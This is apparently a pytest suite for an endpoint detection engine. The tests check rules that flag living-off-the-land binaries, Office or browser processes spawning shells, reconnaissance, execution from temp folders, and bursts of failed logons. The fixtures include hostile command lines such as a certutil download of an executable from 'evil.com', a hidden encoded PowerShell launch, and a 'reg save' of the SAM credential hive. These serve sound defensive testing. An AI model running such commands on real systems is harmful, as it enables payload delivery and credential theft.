"""Tests for the Explainable Behavioral Detection Engine and Rules."""

from datetime import datetime, timezone, timedelta
from pathlib import Path
import pytest
from sqlalchemy import select
from sqlalchemy.orm import Session

from tracehunt.detection import (
    BaseRule,
    DetectionContext,
    DetectionEngine,
    Rule001Lolbin,
    Rule002ProcSpawn,
    Rule003Recon,
    Rule004Evasion,
    Rule005AuthAnomaly,
    RuleMatch,
)
from tracehunt.graph.reconstructor import build_host_process_graph
from tracehunt.ingestion.importer import import_telemetry_file
from tracehunt.models import EndpointEvent, Finding


def test_rule_001_lolbin_matches_suspicious_flags_and_ignores_benign():
    """Verify Rule 001 detects certutil, bitsadmin, powershell with encoded flags, and mshta."""
    rule = Rule001Lolbin()
    t0 = datetime(2026, 10, 21, 14, 0, 0, tzinfo=timezone.utc)

    # 1. Suspicious certutil
    suspicious_certutil = EndpointEvent(
        id=1,
        host="H1",
        event_time=t0,
        event_type="PROCESS_CREATE",
        image="C:\\Windows\\System32\\certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://evil.com/p.exe out.exe",
    )
    matches = rule.evaluate(suspicious_certutil, DetectionContext([suspicious_certutil]))
    assert len(matches) == 1
    assert matches[0].rule_id == "RULE-001-LOLBIN"
    assert matches[0].severity == "HIGH"
    assert "-urlcache" in matches[0].matched_fields["matched_indicators"]

    # 2. Benign certutil (e.g. dump certificate)
    benign_certutil = EndpointEvent(
        id=2,
        host="H1",
        event_time=t0,
        event_type="PROCESS_CREATE",
        image="C:\\Windows\\System32\\certutil.exe",
        command_line="certutil.exe -dump C:\\test.cer",
    )
    assert len(rule.evaluate(benign_certutil, DetectionContext([benign_certutil]))) == 0

    # 3. Suspicious powershell with -enc
    suspicious_ps = EndpointEvent(
        id=3,
        host="H1",
        event_time=t0,
        event_type="PROCESS_CREATE",
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -nop -w hidden -enc JABzAD0A...",
    )
    matches_ps = rule.evaluate(suspicious_ps, DetectionContext([suspicious_ps]))
    assert len(matches_ps) == 1
    assert "-enc" in matches_ps[0].matched_fields["matched_indicators"]

    # 4. Benign powershell without encoded command
    benign_ps = EndpointEvent(
        id=4,
        host="H1",
        event_time=t0,
        event_type="PROCESS_CREATE",
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -NoProfile Get-Process",
    )
    assert len(rule.evaluate(benign_ps, DetectionContext([benign_ps]))) == 0


def test_rule_002_proc_spawn_matches_office_and_browser_children():
    """Verify Rule 002 detects Office or web browser processes spawning command interpreters."""
    rule = Rule002ProcSpawn()
    t0 = datetime(2026, 10, 21, 14, 0, 0, tzinfo=timezone.utc)

    # 1. Direct parent image in event: WINWORD -> cmd.exe
    event_word = EndpointEvent(
        id=10,
        host="H1",
        event_time=t0,
        event_type="PROCESS_CREATE",
        process_id=2000,
        parent_process_id=1000,
        image="C:\\Windows\\System32\\cmd.exe",
        parent_image="C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
        command_line="cmd.exe /c calc.exe",
    )
    matches = rule.evaluate(event_word, DetectionContext([event_word]))
    assert len(matches) == 1
    assert matches[0].rule_id == "RULE-002-PROC-SPAWN"
    assert matches[0].matched_fields["parent_binary"] == "winword.exe"
    assert matches[0].matched_fields["child_binary"] == "cmd.exe"

    # 2. Parent image resolved via process graph context: chrome.exe -> powershell.exe
    parent_chrome = EndpointEvent(
        id=20,
        host="H1",
        event_time=t0,
        event_type="PROCESS_CREATE",
        process_id=3000,
        parent_process_id=500,
        image="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    )
    child_ps = EndpointEvent(
        id=21,
        host="H1",
        event_time=t0 + timedelta(seconds=2),
        event_type="PROCESS_CREATE",
        process_id=3001,
        parent_process_id=3000,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -c whoami",
        # Note: parent_image is None on the event itself
    )
    graph, _ = build_host_process_graph([parent_chrome, child_ps])
    context = DetectionContext(events=[parent_chrome, child_ps], process_graph=graph)

    matches_ps = rule.evaluate(child_ps, context)
    assert len(matches_ps) == 1
    assert matches_ps[0].matched_fields["parent_binary"] == "chrome.exe"
    assert matches_ps[0].matched_fields["parent_resolution_method"] == "process_graph_predecessor"

    # 3. Benign spawn: explorer.exe -> cmd.exe (should NOT fire)
    benign_spawn = EndpointEvent(
        id=30,
        host="H1",
        event_time=t0,
        event_type="PROCESS_CREATE",
        process_id=4000,
        parent_process_id=1000,
        image="C:\\Windows\\System32\\cmd.exe",
        parent_image="C:\\Windows\\explorer.exe",
        command_line="cmd.exe",
    )
    assert len(rule.evaluate(benign_spawn, DetectionContext([benign_spawn]))) == 0


def test_rule_003_recon_matches_enumeration_commands():
    """Verify Rule 003 detects whoami /all, net user, nltest, reg save of SAM."""
    rule = Rule003Recon()
    t0 = datetime(2026, 10, 21, 14, 0, 0, tzinfo=timezone.utc)

    # 1. whoami /all
    ev_whoami = EndpointEvent(
        id=1,
        host="H1",
        event_time=t0,
        event_type="PROCESS_CREATE",
        image="C:\\Windows\\System32\\whoami.exe",
        command_line="whoami.exe /all",
    )
    m1 = rule.evaluate(ev_whoami, DetectionContext([ev_whoami]))
    assert len(m1) == 1
    assert m1[0].rule_id == "RULE-003-RECON"
    assert "/all" in m1[0].matched_fields["matched_indicators"]

    # 2. net user /domain
    ev_net = EndpointEvent(
        id=2,
        host="H1",
        event_time=t0,
        event_type="PROCESS_CREATE",
        image="C:\\Windows\\System32\\net.exe",
        command_line="net.exe user /domain",
    )
    m2 = rule.evaluate(ev_net, DetectionContext([ev_net]))
    assert len(m2) == 1
    assert "user" in m2[0].matched_fields["matched_indicators"]

    # 3. reg save HKLM\SAM
    ev_reg = EndpointEvent(
        id=3,
        host="H1",
        event_time=t0,
        event_type="PROCESS_CREATE",
        image="C:\\Windows\\System32\\reg.exe",
        command_line="reg.exe save HKLM\\SAM C:\\temp\\sam.save",
    )
    m3 = rule.evaluate(ev_reg, DetectionContext([ev_reg]))
    assert len(m3) == 1
    assert "sam" in m3[0].matched_fields["matched_indicators"]

    # 4. Benign whoami without flags
    ev_benign_whoami = EndpointEvent(
        id=4,
        host="H1",
        event_time=t0,
        event_type="PROCESS_CREATE",
        image="C:\\Windows\\System32\\whoami.exe",
        command_line="whoami.exe",
    )
    assert len(rule.evaluate(ev_benign_whoami, DetectionContext([ev_benign_whoami]))) == 0


def test_rule_004_evasion_matches_temp_paths_and_ignores_normal():
    """Verify Rule 004 detects execution from Temp/AppData\\Local\\Temp and ignores Program Files."""
    rule = Rule004Evasion()
    t0 = datetime(2026, 10, 21, 14, 0, 0, tzinfo=timezone.utc)

    # 1. Suspicious AppData\Local\Temp
    ev_temp = EndpointEvent(
        id=1,
        host="H1",
        event_time=t0,
        event_type="PROCESS_CREATE",
        image="C:\\Users\\alice\\AppData\\Local\\Temp\\malware.exe",
        command_line="malware.exe",
    )
    m1 = rule.evaluate(ev_temp, DetectionContext([ev_temp]))
    assert len(m1) == 1
    assert m1[0].rule_id == "RULE-004-EVASION"
    assert "User Local AppData Temp folder" in m1[0].matched_fields["matched_temp_location"]

    # 2. Suspicious Windows\Temp with forward slashes (normalizer converts/handles)
    ev_win_temp = EndpointEvent(
        id=2,
        host="H1",
        event_time=t0,
        event_type="PROCESS_CREATE",
        image="C:/Windows/Temp/dropped.bat",
        command_line="dropped.bat",
    )
    m2 = rule.evaluate(ev_win_temp, DetectionContext([ev_win_temp]))
    assert len(m2) == 1

    # 3. Benign execution from Program Files
    ev_benign = EndpointEvent(
        id=3,
        host="H1",
        event_time=t0,
        event_type="PROCESS_CREATE",
        image="C:\\Program Files\\Notepad++\\notepad++.exe",
        command_line="notepad++.exe",
    )
    assert len(rule.evaluate(ev_benign, DetectionContext([ev_benign]))) == 0


def test_rule_005_auth_anomaly_matches_burst_failures_followed_by_process():
    """Verify Rule 005 detects threshold of logon failures followed by process execution."""
    rule = Rule005AuthAnomaly(lookback_seconds=300, failure_threshold=3)
    t0 = datetime(2026, 10, 21, 14, 0, 0, tzinfo=timezone.utc)

    # 3 logon failures for user 'admin' on host 'SRV-01'
    f1 = EndpointEvent(id=1, host="SRV-01", event_time=t0, event_type="LOGON_FAILURE", user="admin", ip_address="10.0.0.5")
    f2 = EndpointEvent(id=2, host="SRV-01", event_time=t0 + timedelta(seconds=10), event_type="LOGON_FAILURE", user="admin", ip_address="10.0.0.5")
    f3 = EndpointEvent(id=3, host="SRV-01", event_time=t0 + timedelta(seconds=20), event_type="LOGON_FAILURE", user="admin", ip_address="10.0.0.5")

    # Subsequent process execution 30 seconds later by 'admin'
    proc = EndpointEvent(
        id=4,
        host="SRV-01",
        event_time=t0 + timedelta(seconds=50),
        event_type="PROCESS_CREATE",
        process_id=9000,
        user="admin",
        image="C:\\Windows\\System32\\cmd.exe",
        command_line="cmd.exe /c whoami",
    )

    all_events = [f1, f2, f3, proc]
    context = DetectionContext(all_events)

    matches = rule.evaluate(proc, context)
    assert len(matches) == 1
    assert matches[0].rule_id == "RULE-005-AUTH-ANOMALY"
    assert matches[0].matched_fields["failure_count"] == 3
    assert matches[0].matched_fields["user"] == "admin"


def test_rule_005_auth_anomaly_ignores_isolated_failures_or_outside_window():
    """Verify Rule 005 does not trigger if failure count is below threshold or outside lookback window."""
    rule = Rule005AuthAnomaly(lookback_seconds=300, failure_threshold=3)
    t0 = datetime(2026, 10, 21, 14, 0, 0, tzinfo=timezone.utc)

    # Only 2 failures (below threshold of 3)
    f1 = EndpointEvent(id=1, host="SRV-01", event_time=t0, event_type="LOGON_FAILURE", user="admin")
    f2 = EndpointEvent(id=2, host="SRV-01", event_time=t0 + timedelta(seconds=10), event_type="LOGON_FAILURE", user="admin")
    proc = EndpointEvent(id=3, host="SRV-01", event_time=t0 + timedelta(seconds=20), event_type="PROCESS_CREATE", user="admin", image="cmd.exe")

    context = DetectionContext([f1, f2, proc])
    assert len(rule.evaluate(proc, context)) == 0

    # 3 failures, but they occurred 10 minutes (600s) ago (outside window)
    f_old1 = EndpointEvent(id=10, host="SRV-01", event_time=t0, event_type="LOGON_FAILURE", user="admin")
    f_old2 = EndpointEvent(id=11, host="SRV-01", event_time=t0 + timedelta(seconds=1), event_type="LOGON_FAILURE", user="admin")
    f_old3 = EndpointEvent(id=12, host="SRV-01", event_time=t0 + timedelta(seconds=2), event_type="LOGON_FAILURE", user="admin")
    proc_later = EndpointEvent(id=13, host="SRV-01", event_time=t0 + timedelta(seconds=600), event_type="PROCESS_CREATE", user="admin", image="cmd.exe")

    context_old = DetectionContext([f_old1, f_old2, f_old3, proc_later])
    assert len(rule.evaluate(proc_later, context_old)) == 0


def test_edge_cases_and_missing_fields_do_not_crash_rules():
    """Verify that events with missing fields (null image, null command line, empty strings) are safely evaluated."""
    t0 = datetime(2026, 10, 21, 14, 0, 0, tzinfo=timezone.utc)

    edge_events = [
        EndpointEvent(id=1, host="EDGE", event_time=t0, event_type="PROCESS_CREATE", image=None, command_line=None),
        EndpointEvent(id=2, host="EDGE", event_time=t0, event_type="PROCESS_CREATE", image="", command_line=""),
        EndpointEvent(id=3, host="EDGE", event_time=t0, event_type="NETWORK_CONNECT", image=None, command_line=None),
        EndpointEvent(id=4, host="EDGE", event_time=t0, event_type="PROCESS_TERMINATE", image="C:\\cmd.exe"),
    ]

    engine = DetectionEngine()
    summary = engine.evaluate_events(edge_events, persist=False)

    assert summary.events_examined == 4
    assert len(summary.errors) == 0
    assert summary.findings_created == 0


def test_detection_engine_evaluates_and_persists_findings(test_session: Session):
    """Verify DetectionEngine executes enabled rules and persists findings with valid foreign keys."""
    t0 = datetime(2026, 10, 21, 14, 0, 0, tzinfo=timezone.utc)

    event = EndpointEvent(
        host="ENGINE-HOST",
        event_time=t0,
        event_id=1,
        event_type="PROCESS_CREATE",
        process_id=5000,
        image="C:\\Windows\\System32\\certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://test.com/payload.exe payload.exe",
        user="CORP\\victim",
    )
    test_session.add(event)
    test_session.flush()

    engine = DetectionEngine()
    summary = engine.evaluate_events([event], session=test_session, persist=True)

    assert summary.findings_created == 1
    assert len(summary.findings) == 1

    stored_finding = test_session.scalars(
        select(Finding).where(Finding.endpoint_event_id == event.id)
    ).first()
    assert stored_finding is not None
    assert stored_finding.rule_id == "RULE-001-LOLBIN"
    assert stored_finding.severity == "HIGH"
    assert stored_finding.confidence == "HIGH"
    assert "certutil" in stored_finding.rationale


def test_detection_engine_idempotency_prevents_duplicate_findings(test_session: Session):
    """Verify repeated evaluation of the same event does not insert duplicate findings."""
    t0 = datetime(2026, 10, 21, 14, 0, 0, tzinfo=timezone.utc)

    event = EndpointEvent(
        host="IDEMP-DETECT",
        event_time=t0,
        event_id=1,
        event_type="PROCESS_CREATE",
        process_id=5001,
        image="C:\\Windows\\System32\\whoami.exe",
        command_line="whoami.exe /all",
        user="CORP\\victim",
    )
    test_session.add(event)
    test_session.flush()

    engine = DetectionEngine()

    # First evaluation run
    summary1 = engine.evaluate_events([event], session=test_session, persist=True)
    assert summary1.findings_created == 1
    assert summary1.duplicates_skipped == 0

    # Second evaluation run on identical event
    summary2 = engine.evaluate_events([event], session=test_session, persist=True)
    assert summary2.findings_created == 0
    assert summary2.duplicates_skipped == 1

    # Verify database holds exactly 1 finding
    count = test_session.query(Finding).filter_by(endpoint_event_id=event.id).count()
    assert count == 1


def test_detection_engine_disabled_rule_is_skipped(test_session: Session):
    """Verify that disabled rules are not evaluated."""
    t0 = datetime(2026, 10, 21, 14, 0, 0, tzinfo=timezone.utc)

    event = EndpointEvent(
        host="DISABLE-TEST",
        event_time=t0,
        event_id=1,
        event_type="PROCESS_CREATE",
        process_id=5002,
        image="C:\\Windows\\System32\\certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://test.com/payload.exe payload.exe",
    )
    test_session.add(event)
    test_session.flush()

    engine = DetectionEngine()
    engine.disable_rule("RULE-001-LOLBIN")

    summary = engine.evaluate_events([event], session=test_session, persist=True)
    assert summary.findings_created == 0
    assert summary.rules_evaluated == 4  # 5 minus 1 disabled


def test_detection_engine_error_isolation_records_errors_and_continues(test_session: Session):
    """Verify that if a faulty rule throws an exception, it is recorded and other rules continue."""
    t0 = datetime(2026, 10, 21, 14, 0, 0, tzinfo=timezone.utc)

    class FaultyRule(BaseRule):
        id = "RULE-FAIL-001"
        name = "Faulty Test Rule"
        description = "Intentionally throws an exception"

        def evaluate(self, event, context):
            raise RuntimeError("Simulated rule crash!")

    engine = DetectionEngine()
    engine.register_rule(FaultyRule())

    event = EndpointEvent(
        host="FAIL-TEST",
        event_time=t0,
        event_id=1,
        event_type="PROCESS_CREATE",
        process_id=5003,
        image="C:\\Windows\\System32\\whoami.exe",
        command_line="whoami.exe /all",
    )
    test_session.add(event)
    test_session.flush()

    summary = engine.evaluate_events([event], session=test_session, persist=True)

    # Faulty rule recorded error
    assert len(summary.errors) == 1
    assert "Simulated rule crash!" in summary.errors[0]

    # But RULE-003 still evaluated and found a match!
    assert summary.findings_created == 1
    assert summary.findings[0].rule_id == "RULE-003-RECON"


def test_attack_scenarios_fixture_detection(test_session: Session):
    """Verify DetectionEngine against the full attack scenarios fixture fixtures/suspicious/detection_scenarios.json."""
    fixture_path = Path("fixtures/suspicious/detection_scenarios.json")
    summary_ingest = import_telemetry_file(fixture_path, test_session)
    assert summary_ingest.events_normalized == 12

    engine = DetectionEngine()
    # Evaluate across all hosts in the imported fixture
    stmt = select(EndpointEvent.host).distinct()
    hosts = list(test_session.scalars(stmt).all())

    total_findings = 0
    detected_rules: set[str] = set()

    for host in hosts:
        summary = engine.evaluate_host(host, test_session, persist=True)
        total_findings += summary.findings_created
        for f in summary.findings:
            detected_rules.add(f.rule_id)

    # Every one of the 5 rules must be triggered by the attack scenarios fixture!
    expected_rules = {
        "RULE-001-LOLBIN",
        "RULE-002-PROC-SPAWN",
        "RULE-003-RECON",
        "RULE-004-EVASION",
        "RULE-005-AUTH-ANOMALY",
    }
    assert expected_rules.issubset(detected_rules), f"Missing rules: {expected_rules - detected_rules}"
    assert total_findings >= 6


def test_benign_fixtures_produce_zero_false_positives(test_session: Session):
    """Verify DetectionEngine evaluated on benign lookalikes produces zero false positives (0 FP)."""
    fixture_path = Path("fixtures/benign/benign_lookalikes.json")
    summary_ingest = import_telemetry_file(fixture_path, test_session)
    assert summary_ingest.events_normalized == 12

    engine = DetectionEngine()
    summary = engine.evaluate_host("BENIGN-HOST", test_session, persist=True)

    assert summary.events_examined == 12
    assert summary.findings_created == 0, f"False positives detected: {summary.findings}"


def test_detection_precision_recall_metrics(test_session: Session):
    """Evaluate synthetic TP, FP, FN metrics across labelled fixtures."""
    # 1. Ingest benign fixture
    import_telemetry_file(Path("fixtures/benign/benign_lookalikes.json"), test_session)
    # 2. Ingest suspicious fixture
    import_telemetry_file(Path("fixtures/suspicious/detection_scenarios.json"), test_session)

    engine = DetectionEngine()

    # Evaluate Benign Host
    benign_summary = engine.evaluate_host("BENIGN-HOST", test_session, persist=True)
    fp = benign_summary.findings_created

    # Evaluate Threat Host & Auth Host
    threat_summary = engine.evaluate_host("THREAT-HOST", test_session, persist=True)
    auth_summary = engine.evaluate_host("AUTH-HOST", test_session, persist=True)
    tp = threat_summary.findings_created + auth_summary.findings_created

    # Total expected detections from scenarios:
    # certutil (R1), powershell enc (R1), winword cmd (R2), chrome ps (R2), whoami (R3), net (R3), reg (R3 + R4), temp (R4), auth (R5) = 10 matches
    fn = max(0, 10 - tp)

    precision = tp / (tp + fp) if (tp + fp) > 0 else 0.0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0

    assert fp == 0, f"Expected 0 False Positives, got {fp}"
    assert tp >= 9, f"Expected at least 9 True Positives, got {tp}"
    assert precision == 1.0, f"Expected 1.0 precision, got {precision}"
    assert recall >= 0.9, f"Expected >= 0.9 recall, got {recall}"
